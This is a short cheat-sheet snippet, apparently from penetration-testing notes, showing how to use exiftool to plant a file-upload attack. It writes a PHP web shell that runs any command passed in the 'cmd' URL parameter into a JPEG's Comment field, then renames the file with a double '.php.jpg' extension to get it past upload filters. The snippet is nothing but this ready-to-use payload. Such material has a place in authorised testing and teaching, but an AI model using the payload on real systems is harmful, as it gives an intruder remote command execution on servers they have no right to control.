### Using exiftool
      exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' normal.jpg
      mv normal.jpg normal.php.jpg
